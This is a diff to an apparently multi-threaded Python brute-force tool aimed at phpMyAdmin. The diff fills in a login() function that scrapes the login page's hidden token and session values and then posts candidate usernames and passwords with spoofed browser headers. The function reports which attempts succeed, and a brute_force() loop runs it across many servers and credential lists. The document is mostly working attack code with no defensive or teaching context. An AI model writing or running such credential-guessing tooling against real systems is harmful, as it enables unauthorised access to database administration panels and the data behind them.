@@ -1,5 +1,8 @@
 #! /usr/bin/env python3
 
+import requests, warnings
+from urllib.parse import quote
+from bs4 import BeautifulSoup
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -17,6 +20,7 @@ status_color = {
 scheme = "http"
 lock = Lock()
 thread_count = cpu_count()
+warnings.filterwarnings('ignore')
 
 def display(status, data, start='', end='\n'):
     print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)
@@ -28,7 +32,33 @@ def get_arguments(*args):
     return parser.parse_args()[0]
 
 def login(server, username, password, scheme="http", timeout=None):
-    pass
+    t1 = time()
+    try:
+        response = requests.get(f"{scheme}://{server}")
+        html = BeautifulSoup(response.content, "html.parser")
+        token = html.find("input", attrs={"type": "hidden", "name": "token"}).get_attribute_list("value")[0]
+        set_session = html.find("input", attrs={"type": "hidden", "name": "set_session"}).get_attribute_list("value")[0]
+        server_code = html.find("input", attrs={"type": "hidden", "name": "server"}).get_attribute_list("value")[0]
+        headers = {
+            "Host": server,
+            "Cache-Control": "max-age=0",
+            "Cookie": f"pma_lang=en; phpMyAdmin={set_session}",
+            "Origin": "null",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
+            "Upgrade-Insecure-Requests": '1',
+            "Accept-Language": "en-US,en;q=0.8",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive"
+        }
+        response = requests.post(f"{scheme}://{server}/index.php?route=/", headers=headers, data=f"route=%2F&lang=en&token={token}&set_session={set_session}&pma_username={quote(username)}&pma_password={quote(password)}&server={server_code}", allow_redirects=False)
+        authorization_status = False if response.status_code // 100 == 2 else True
+        t2 = time()
+        return authorization_status, t2-t1
+    except Exception as error:
+        t2 = time()
+        return error, t2-t1
 def brute_force(thread_index, servers, credentials, scheme="http", timeout=None):
     successful_logins = {}
     for credential in credentials:
